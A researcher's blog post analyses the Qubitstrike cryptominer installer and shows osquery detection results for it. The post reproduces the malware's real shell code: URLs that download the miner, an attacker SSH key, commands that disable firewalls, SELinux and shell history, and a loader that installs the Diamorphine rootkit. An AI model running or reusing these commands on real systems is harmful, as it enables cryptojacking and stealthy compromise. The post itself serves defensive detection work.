This morning I stumbled into Cado's report on Qubitstrike, an attack on open Jupyter notebook installations. Unlike most security reports, the hosted malware files were still available on Codeberg. This meant it was time to test it against the detection stack I've setup at my employer.

As a fly-by-nite security researcher, I usually don't access to emerging threats, since most folks rely on access to samples hosted behind Google's VirusTotal paywall, which starts at $20k/yr.

Rather than covering material that overlaps with the wonderful Cado report, I'll focus on 
interesting ways to detect this malware.

## Is QubitStrike detectable using open-source software?

TL;DR: existing open-source tools and rules can detect Qubitstrike.

## The QubitStrike Install Script

If you ever wanted to study how your typical malware installer operates on Linux, the installer script is a case study for you - it's got everything!

- Disables security protections
- Fetches content
- Hides the process

Let's work through the script and identify detection opportunities. 

### Initialization

```
miner_url="https://codeberg.org/m4rt1/sh/raw/branch/main/xm64.tar.gz"
miner_name="python-dev"
killer_url="https://codeberg.org/m4rt1/sh/raw/branch/main/killer.sh"
kill_url2="https://codeberg.org/m4rt1/sh/raw/branch/main/kill_loop.sh"
pool="pool.hashvault.pro:80"
MD5="199b790d05724170f3e6583500799db1"
DIR="/usr/share/.LQvKibDTq4"
RSA="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDV+S/3d5qwXg1yvfOm3ZTHqyE2F0zfQv1g12Wb7H4N5EnP1m8WvBOQKJ2htWqcDg2dpweE7htcRsHDxlkv2u+MC0g1b8Z/HawzqY2Z5FH4LtnlYq1QZcYbYIPzWCxifNbHPQGexpT0v/e6z27NiJa6XfE0DMpuX7lY9CVUrBWylcINYnbGhgSDtHnvSspSi4Qu7YuTnee3piyIZhN9m+tDgtz+zgHNVx1j0QpiHibhvfrZQB+tgXWTHqUazwYKR9td68twJ/K1bSY+XoI5F0hzEPTJWoCl3L+CKqA7gC3F9eDs5Kb11RgvGqieSEiWb2z2UHtW9KnTKTRNMdUNA619/5/HAsAcsxynJKYO7V/ifZ+ONFUMtm5oy1UH+49ha//UPWUA6T6vaeApzyAZKuMEmFGcNR3GZ6e8rDL0/miNTk6eq3JiQFR/hbHpn8h5Zq9NOtCoUU7lOvTGAzXBlfD5LIlzBnMA3EpigTvLeuHWQTqNPEhjYNy/YoPTgBAaUJE= root@kali"
[[ $EUID -eq 0 ]] || DIR="/tmp/.LQvKibDTq4" ;
```

There are already multiple detection opportunities, as the following things are highly irregular to find in executables or shell scripts:

- References to `codeberg.org/.*/raw/`
- References to `hashvault` or `miner_`
- References to hidden `/usr/share` and `/tmp` directories
- SSH keys

### Fetch Tools

I'm going to switch to showing the output of `bash -x` on the script, since it makes the behaviors a little bit more apparent and interesting. First, it installs wget and curl:

```
---------------------------------------
 INSTALLING WGET, CURL ...
---------------------------------------
+ type apt
+ apt-get update --fix-missing
Hit:1 http://archive.ubuntu.com/ubuntu lunar InRelease                   
Hit:2 http://security.ubuntu.com/ubuntu lunar-security InRelease         
Hit:3 http://archive.ubuntu.com/ubuntu lunar-updates InRelease           
Hit:4 http://archive.ubuntu.com/ubuntu lunar-backports InRelease
Reading package lists... Done
+ apt-get install wget curl -y
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
wget is already the newest version (1.21.3-1ubuntu1).
curl is already the newest version (7.88.1-8ubuntu2.3).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
```

Then it moves curl and wget a new location to break future attackers:

```
---------------------------------------
 Replacing WGET, CURL ...
---------------------------------------
+ sleep 1s
+ [[ -f /usr/bin/wget ]]
+ mv /usr/bin/wget /usr/bin/zget
+ [[ -f /usr/bin/curl ]]
+ mv /usr/bin/curl /usr/bin/zurl
+ [[ -f /bin/wget ]]
+ [[ -f /bin/curl ]]
++ command -v zget
+ [[ -x /usr/bin/zget ]]
+ req='zget -q -O -'
+ DLr='zget -O'
```

Then we use the newly renamed fetch tool to grab our IP, which we will later use to define our miner client:

```
---------------------------------------
 Downloader is cp 
 Requester is zget -q -O - 
---------------------------------------
++ zget -q -O - ifconfig.me
+ client=136.54.68.146
 ```


Clearly, this malware is not designed to be hidden on an end-users machine, as many users would get suspicious about curl suddenly missing.  The brilliant part about this is that this script
is going to fetch all of it's dependencies with `zurl` or `zget`, bypassing the rules of many a detection system.

Still, there are detection opportunities to be had, for scripts or executables that:

- Install curl/wget with `-y`
- Install linux-headers
- Move things out of `/bin` or `/usr/bin`
- Make requests to `ifconfig.me` 

After this, things get exciting, as the malware actively degrades the security posture of the host:

```
---------------------------------------
 Begin disable security 
---------------------------------------
+ cover
+ iptables -F
+ systemctl stop firewalld
+ systemctl disable firewalld
+ ulimit -n 65535
+ HISTCONTROL=ignorespace
+ export HISTFILE=/dev/null
+ unset HISTFILE
+ shopt -ou history
+ set +o history
+ HISTSIZE=0
+ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+ export DEBIAN_FRONTEND=noninteractive
+ DEBIAN_FRONTEND=noninteractive
+ setenforce 0
+ echo SELINUX=disabled
+ sysctl kernel.nmi_watchdog=0
sysctl: setting key "kernel.nmi_watchdog": Unknown error 524
+ sysctl kernel.nmi_watchdog=0
sysctl: setting key "kernel.nmi_watchdog": Unknown error 524
+ echo 0
./local-mi.sh: line 72: echo: write error: Unknown error 524
+ echo kernel.nmi_watchdog=0
+ grep -q 8.8.8.8 /etc/resolv.conf
+ echo 'nameserver 8.8.8.8'
+ grep -q 8.8.4.4 /etc/resolv.conf
+ echo 'nameserver 8.8.4.4'
+ iptables -A OUTPUT -p tcp --dport 3333 -j DROP
+ iptables -A OUTPUT -p tcp --dport 5555 -j DROP
+ iptables -A OUTPUT -p tcp --dport 7777 -j DROP
+ iptables -A OUTPUT -p tcp --dport 9999 -j DROP
+ iptables -A INPUT -s xmr.crypto-pool.fr -j DROP
+ iptables -A OUTPUT -p tcp --dport 10343 -j DROP
+ iptables -A OUTPUT -p tcp --dport 10300 -j DROP
+ sleep 1s

```

This flushes the iptables firewall rules and then stops firewalld: a system for managing firewall rules that is enabled by default on Red Hat flavored Linux's. Each of these lines should probably cause an alert to fire in your environment.

Now it spends a lot of time hiding itself from shell history:

```
    HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" > /dev/null 2>&1
    export HISTFILE=/dev/null > /dev/null 2>&1
    unset HISTFILE > /dev/null 2>&1
    shopt -ou history > /dev/null 2>&1
    set +o history > /dev/null 2>&1
    HISTSIZE=0 > /dev/null 2>&1
```

Before disabling SELinux:

```
    setenforce 0 > /dev/null 2>&1
    echo SELINUX=disabled >/etc/selinux/config
```

QubitStrike desperately tries to turn off the NMI Watchdog in Linux. I'm not sure if this is to increase mining performance, or to avoid the machine from rebooting if the miner steals all of the CPU:

```
    sysctl kernel.nmi_watchdog=0
    sysctl kernel.nmi_watchdog=0
    echo '0' >/proc/sys/kernel/nmi_watchdog
    echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
```

QubitStrike then reprograms the DNS servers to point to Google DNS. I suspect this is done to improve reliability, but it could be a way to bypass detection controls that rely on a custom DNS resolver. The chattr

```
    grep -q 8.8.8.8 /etc/resolv.conf || chattr -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf;
    grep -q 8.8.4.4 /etc/resolv.conf || chattr -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf;
```

The firewall rules are reprogrammed to drop packets to and from competing miners:

```
    iptables -A OUTPUT -p tcp --dport 3333 -j DROP > /dev/null 2>&1
    iptables -A OUTPUT -p tcp --dport 5555 -j DROP > /dev/null 2>&1
    iptables -A OUTPUT -p tcp --dport 7777 -j DROP > /dev/null 2>&1
    iptables -A OUTPUT -p tcp --dport 9999 -j DROP > /dev/null 2>&1
    iptables -A INPUT -s xmr.crypto-pool.fr -j DROP > /dev/null 2>&1
    iptables -A OUTPUT -p tcp --dport 10343 -j DROP > /dev/null 2>&1
    iptables -A OUTPUT -p tcp --dport 10300 -j DROP > /dev/null 2>&1
}
```

Then we get to setting up the Cryptominer. There are actually two functions depending on if the script is running as root or not, but the only difference is how the client ID is generated. By default, it's the IP address of the machine:

```
miner() {
if [[ ! $DLr -eq 0 ]] ; then
    $DLr $DIR/xm.tar.gz $miner_url > /dev/null 2>&1
    tar -xf $DIR/xm.tar.gz -C $DIR
    rm -rf $DIR/xm.tar.gz > /dev/null 2>&1
    chmod +x $DIR/*
    $DIR/python-dev -B -o $pool -u $wallet -p $client --donate-level 1 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 90
else
    if [ "$(command -v python3)" ] ; then
        python3 -c "import urllib.request; urllib.request.urlretrieve('$miner_url', '$DIR/xm.tar.gz')"
...
}
```
There aren't a ton of opportunities there for detection, especially because the default fetcher is `zurl` and `zget`. It is rare to see `--donate-level` mentioned, as is the call `"import urllib.request; urllib.request.urlretrieve(` - so those are possibilities.

## Surprise, it's Diamorphine!

Next up in the malware is:

```
hide1() {
ins_package
hidf='H4sIAAAAAAAAA+0ba3PbNjJfxV+BKq2HVGRbshW1jerMuLLi6PyQR7bb3ORyGJ....smBzQAUAAA'
echo $hidf|base64 -d > $DIR/hf.tar
tar -xf $DIR/hf.tar -C $DIR/
cd $DIR
make
proc="$(ps aux | grep -v grep | grep 'python-dev' | awk '{print $2}')"
if [ -f "$DIR/diamorphine.ko" ] ; then
    insmod diamorphine.ko
    echo "Hiding process ( python-dev ) pid ( $proc )"
    kill -31 $proc
else
    rm -rf $DIR/diamorphine*
    rm $DIR/Make*
    rm -f $DIR/hf.tar
fi
}
```

Before we explore that, let's look at `ins_package` real quick, which installs Linux kernel headers.

```
ins_package() {
if type apt > /dev/null 2>&1 ; then apt update -qq --fix-missing ; apt-get install -y -qq gcc make kmod wget net-tools "linux-headers-$(uname -r)" -o Dpkg::Progress-Fancy="0" -o APT::Color="0" -o Dpkg::Use-Pty="0" ;
elif type yum > /dev/null 2>&1 ; then yum clean all ; yum install -y gcc wget make kmod net-tools "kernel-devel-uname-r == $(uname -r)" ;
elif type apk > /dev/null 2>&1 ; then apk update ; apk add gcc make wget kmod  linux-headers net-tools ;
fi
}
```

If you think we might be installing a rootkit in $hidf, you would be right. It's Diamorphine! The biggest surprise for me in this analysis is that Diamorphine now supports modern Linux kernels. I take back everything I say about how unreliable kernel implants are on Linux, because this script gets it right on modern Ubuntu systems.

root@lima-qubitstrike:/tmp/lima/osquery-defense-kit# make detect

pid-hidden-by-rootkit (1 rows)
------------------------------
cgroup_path:/user.slice/user-501.slice/session-4.scope cmdline:'/usr/share/.LQvKibDTq4/python-dev -B -o pool.hashvault.pro:80 -u 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo -p 136.54.68.146 --donate-level 1 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 90' cwd:/ disk_bytes_read:311296 disk_bytes_written:0 egid:0 euid:0 gid:0 name:python-dev nice:0 on_disk:1 parent:1 path:/usr/share/.LQvKibDTq4/python-dev pgroup:4030 pid:4030 resident_size:4096000 root:/ sgid:0 start_time:1697625949 state:S suid:0 system_time:23170 threads:10 total_size:2504282112 uid:0 user_time:6077320 wired_size:0


unexpected-ssh-authorized-keys (1 rows)
---------------------------------------
atime:1697625779 ctime:1697625778 gid:0 mtime:1697625778 path:/root/.ssh/authorized_keys sha256:e8d5053e7c719114b45956695da845840ab45fb3e8d659f4ed991b274a8ed7a8 size:563 u_uid:0 uid:0 username:root

unusually-tainted-kernel-linux (1 rows)
---------------------------------------
force_loaded:0 force_unloaded:0 is_aux:0 is_unsigned:8192 kernel_warning:0 modules:nft_compat,nft_chain_nat,overlay,xt_tcpudp,xt_nat,xt_multiport,xt_mark,xt_conntrack,xt_comment,xt_addrtype,xt_MASQUERADE,nf_tables,nfnetlink,ip6table_filter,iptable_filter,ip6table_nat,iptable_nat,nf_nat,nf_conntrack,nf_defrag_ipv6,nf_defrag_ipv4,ip6_tables,veth,bridge,stp,llc,tap,tls,isofs,kvm_amd,ccp,binfmt_misc,kvm,irqbypass,virtio_input,nls_iso8859_1,input_leds,serio_raw,dm_multipath,scsi_dh_rdac,scsi_dh_emc,scsi_dh_alua,efi_pstore,ip_tables,x_tables,autofs4,btrfs,blake2b_generic,raid10,raid456,async_raid6_recov,async_memcpy,async_pq,async_xor,async_tx,xor,raid6_pq,libcrc32c,raid1,raid0,multipath,linear,virtio_gpu,virtio_dma_buf,drm_shmem_helper,drm_kms_helper,syscopyarea,sysfillrect,sysimgblt,psmouse,ahci,virtio_net,drm,libahci,net_failover,virtio_blk,xhci_pci,xhci_pci_renesas,virtio_rng,failover out_of_spec:0 out_of_tree:4096 proprietary:0 requested_by_userspace:0 taint:12288


## Fragile Persistence

QubitStrike does not survive reboots. 

